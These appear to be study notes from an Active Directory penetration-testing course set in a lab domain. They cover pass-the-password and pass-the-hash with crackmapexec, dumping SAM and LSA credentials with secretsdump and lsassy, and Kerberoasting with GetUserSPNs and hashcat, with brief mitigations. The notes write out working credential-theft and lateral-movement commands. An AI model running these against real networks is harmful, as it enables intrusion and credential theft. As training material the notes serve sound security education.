
Flow performed till now with the AD attack and Post compromise Attack:
- Using LLMNR we found a user hash -> user hash -> cracked it using hash cat -> sprayed the password -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts.

#### Pass Attacks:

##### Pass the Password:
- In this attack, we are going to use the password we are aware of an exploited account and use it in the crackmapexec to see, where else this username/password can be used and if the user is a local admin in that machine or not
- Syntax:
	- `crackmapexec smb {ip-address/CIDR} -u {user} -d {domain} -p {password}`
##### Pass the Hash:
- In this attack type, we are going to use hashes instead of password, if we are unaware of the user's password. Hashes can be grabbed with below steps:
	- We can run Metasploit with Hasdump module, to get some local hashes of other accounts
	- Along with that, we can also use secretsdump.py to get some local hashes 
	- `secretsdump.py MARVEL.local/fcastle:Password!@10.0.0.25`
	- We can also use secretsdump with an hash instead of an password:
		- `secretsdump.py administrator:@10.0.0.25 -hashes {NTLM hash}`
- Once, we have the SAM hashes for the accounts, we can use the crackmapexec application to check the same, if that user has access  in any other systems
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {SAM hash} --local-auth`
- Also, if we want crackmapexec to dump all the SAM hashes, where ever the successful login is done, this dump the SAM hashes of the machines, which we were able to login
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {hash} --local-auth --sam`
- We can also enumerate shares using the below:
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {hash} --local-auth --shares`
- We also have built in modules in crackmapexec, using below will provide the same:
	- `crackmapexec smb -L`
	- `crackmapexec smb {ip-address/CIDR} -u {username}-H {hash} --local-auth -M lsassy`
		- lsassy is a built in module of crackmapexec, which can be used to dump credentials of other users, if they are logged in to the machine
- We can also use lsa to dump the passwords of users that are logged in and the stored passwords, which can be cracked.
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {hash} --local-auth --lsa`
- Last, but not the least, we can see all the passwords and other details, we obtained using the crackmapexec in the cmedb, this can be accessed using 
	- `cmedb`
	- if we need help - `cmedb` and then type `help`
	- `hosts` to see all the hosts we cracked and `creds` to show all the passwords that has been successfully cracked.

#### Pass Attack Mitigations:

- Hard to completely prevent, but we can make it more difficult on an attacker:
	- Limit account re-use:
		- Avoid re-using local admin password.
		- Disable Guest and Administrator accounts
		- Limit who is a local administrator (least privilege)
	- Utilize strong passwords:
		- The longer the better (> 14 character)
		- Avoid using common words
	- Privilege Access Management (PAM):
		- Check out/in sensitive accounts when needed
		- Automatically rotate passwords on check out and check in
		- Limits pass attacks as hash/password i strong and constantly rotated

#### Kerberoasting:

- Kerberoasting is an attack technique that targets Kerberos authentication in Windows environments. Attackers request service tickets for service accounts, capture these tickets, and then attempt to crack them offline to retrieve the account passwords. This is effective against service accounts, which often have weak passwords and elevated privileges, potentially allowing attackers access to sensitive resources.

- Flow:
	- User requests TGT (Ticket Granting Ticket), provide NTLM Hash -> Domain Controller -> Domain controller responds back with the TGT with krbtgt hash -> User -> User requests TGS (Ticket Granting Service) for Server and provides the TGT -> Domain Controller -> DC then shares the TGS with server's account hash (which can be used to crack service accounts creds) -> Present this TGS to server with server's account -> Application Server

- Goal of the kerberoasting is to get the TGS and decrypt server's account hash
- Tools used for kerberoasting is `Get SPNs`, `Dump Hash`
	- Syntax: `sudo GetUserSPNs.py {domain}/{username:'password'} -dc-ip {dc_ip_address} -request`
	- Example: `sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 10.0.0.1 -request`
- Once we have the TGS with the hash, we can crack the hash using hash cat.
	- `Hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

#### Kerberoasting mitigation:

- Service accounts should not be running as domain admins and make sure we have strong passwords 
- Service accounts should always hold least privilege in the machine


